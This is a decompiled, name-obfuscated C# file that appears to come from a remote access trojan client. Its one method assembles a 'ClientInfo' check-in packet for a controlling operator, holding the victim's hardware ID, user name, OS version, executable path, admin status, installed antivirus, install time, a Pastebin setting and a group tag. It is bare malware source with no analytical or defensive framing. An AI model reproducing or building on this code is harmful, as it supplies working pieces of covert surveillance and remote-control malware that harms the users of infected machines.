using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using lbBmsCGqmaavDk;
using tXzQcBesFjj;

namespace jRqllyjXpPF;

public static class pFzHuedBzMEj
{
	public static byte[] PkuDLljffduR()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		oBaGoFGSOWPojT oBaGoFGSOWPojT = new oBaGoFGSOWPojT();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Packet").UPNpZCCgWUpsQj = "ClientInfo";
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("HWID").UPNpZCCgWUpsQj = dqIziPtAElY.nCfRukxEnMCPvfKsv;
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("User").UPNpZCCgWUpsQj = Environment.UserName.ToString();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("OS").UPNpZCCgWUpsQj = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Path").UPNpZCCgWUpsQj = Application.get_ExecutablePath();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Version").UPNpZCCgWUpsQj = dqIziPtAElY.yiPYSnfWMnNz;
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Admin").UPNpZCCgWUpsQj = ieGRLlRyWBE.DhtRvAvrNyXuS().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Performance").UPNpZCCgWUpsQj = ieGRLlRyWBE.ezgUAvBNkDxRLp();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Pastebin").UPNpZCCgWUpsQj = dqIziPtAElY.RWEQJQqtyTB;
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Antivirus").UPNpZCCgWUpsQj = ieGRLlRyWBE.iFuHLClYhpNKbuUn();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Installed").UPNpZCCgWUpsQj = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Pong").UPNpZCCgWUpsQj = "";
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Group").UPNpZCCgWUpsQj = dqIziPtAElY.EmTGlUkxsv;
		return oBaGoFGSOWPojT.MrbeXnLKFMlfC();
	}
}
